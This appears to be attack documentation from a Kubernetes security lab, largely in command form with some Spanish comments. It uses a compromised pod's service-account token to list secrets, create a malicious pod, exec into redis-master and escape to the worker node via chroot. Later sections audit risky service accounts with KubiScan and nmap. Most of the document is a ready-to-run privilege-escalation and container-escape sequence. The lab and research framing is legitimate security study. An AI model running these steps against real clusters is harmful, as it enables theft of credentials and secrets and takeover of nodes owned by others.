# Attack documentation

```console
kubectl cp ~/tools/kubectl frontend-<hash>-<hash>:/var/www/html/
kubectl cp deployments/overprivileged-service-account/attack-pod.yaml frontend-<hash>-<hash>:/var/www/html/

# check if the current service account can LIST pods
./kubectl \
    --server=https://kubernetes \
    --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` \
    auth can-i list pod

# kubectl get pods
./kubectl \
    --server=https://kubernetes \
    --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` \
    get pod

./kubectl \
    --server=https://kubernetes \
    --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` \
    auth can-i list secrets

TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
curl -k \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    https://kubernetes/api/v1/namespaces/default/secrets

# kubectl get pod redis-master-<hash>-<hash> -o yaml
./kubectl \
    --server=https://kubernetes \
    --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` \
    get pod redis-master-<hash>-<hash> -o yaml

# ---------------------------

kubectl cp ~/tools/kubectl frontend-<hash>-<hash>:/data/
kubectl cp deployments/overprivileged-service-account/attack-pod.yaml frontend-<hash>-<hash>:/data/


./kubectl \
    --server=https://kubernetes \
    --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` \
    auth can-i list secrets

./kubectl \
    --server=https://kubernetes \
    --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` \
    auth can-i get pods/exec

./kubectl \
    --server=https://kubernetes \
    --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` \
    auth can-i create pods/exec

# kubectl create pod based on 'redis-master'
./kubectl \
    --server=https://kubernetes \
    --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` \
    apply -f attack-pod.yaml

# check if the current service account can CREATE pods
./kubectl \
    --server=https://kubernetes \
    --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` \
    auth can-i create pod

# EXEC into redis-master pod
./kubectl \
    --server=https://kubernetes \
    --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` \
    exec -it redis-master-f46ff57fd-bgcdp /bin/bash

# ---------------------------

# con la misma estrategia de Meterpreter shell podemos bajarnos la shell al pod de 'redis-master'
y desde ahí continuar con el ataque. En nuestro caso, obviaremos esto y lo haremos directamente
levantando una shell en ese pod

kubectl cp ~/tools/kubectl redis-master-f46ff57fd-d2bmx:/data/
kubectl cp deployments/overprivileged-service-account/attack-pod.yaml redis-master-f46ff57fd-bgcdp:/data/

# kubectl get pods
./kubectl \
    --server=https://kubernetes \
    --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` \
    get pod

./kubectl \
    --server=https://kubernetes \
    --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` \
    apply -f attack-pod.yaml

# ---------------------------

# una vez desplegado el pod, podemos volver al pod que permite exec (el de frontend) y levantar
una shell en el 'attack-pod'

# obtener una shell en el nodo mediante 'chroot'. primeramente veremos la version del OS
del pod y luego de tener la shell, ver la del OS del nodo.

cat /etc/os-release
14.04

chroot /root /bin/bash
cat /etc/os-release
21.04

echo "You've been pwned!!!" > /tmp/0wn3d.txt

# finalmente para realmente confirmar nuestros cambios en el nodo worker, verificamos donde fue
desplegado el pod, y checkeamos los cambios
kubectl get pod -o wide
docker exec -it tfm-k8s-worker2 bash

cat /tmp/0wn3d.txt

# ---------------------------


kubectl -n kubiscan-ns get serviceaccount kubiscan-sa -o=jsonpath='{.secrets[0].name}' | xargs kubectl -n kubiscan-ns get secret -ojsonpath='{.data.token}' | base64 --decode > tmp/token
kubectl -n kubiscan-ns get serviceaccount kubiscan-sa -o=jsonpath='{.secrets[0].name}' | xargs kubectl -n kubiscan-ns get secret -o json | jq -r '.data["ca.crt"]' | base64 -d > tmp/ca.crt

docker run -it --rm \
    --network host \
    --volume $PWD/tmp/token:/token \
    --volume $PWD/tmp/ca.crt:/ca.crt \
    cyberark/kubiscan

# installing some troubleshooting tools
apt update && apt install iputils-ping dnsutils nmap -y

# checking access to master node and that 'api-server' is listening
nmap -p 6443 172.18.0.4

# searching for pods with privileged service accounts (rs: risky subjects)
kubiscan -ho 172.18.0.4:6443 -t /token -c /ca.crt -rs
kubiscan -ho 172.18.0.4:6443 -t /token -c /ca.crt -rs | grep default

# getting all rules of specify risky service account
kubiscan -ho 172.18.0.4:6443 -t /token -c /ca.crt -aars "frontend-sa" -ns "default" -k "ServiceAccount"
kubiscan -ho 172.18.0.4:6443 -t /token -c /ca.crt -aars "redis-master-sa" -ns "default" -k "ServiceAccount"

# getting rolebindings for risky service accounts
kubiscan -ho 172.18.0.4:6443 -t /token -c /ca.crt -aarbs "frontend-sa" -ns "default" -k "ServiceAccount"
kubiscan -ho 172.18.0.4:6443 -t /token -c /ca.crt -aarbs "redis-master-sa" -ns "default" -k "ServiceAccount"

# ---------------------------

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl \
    -H "Authorization: Bearer $TOKEN" \
    https://kubernetes/api/v1/namespaces/default/pods/ \
    --insecure
```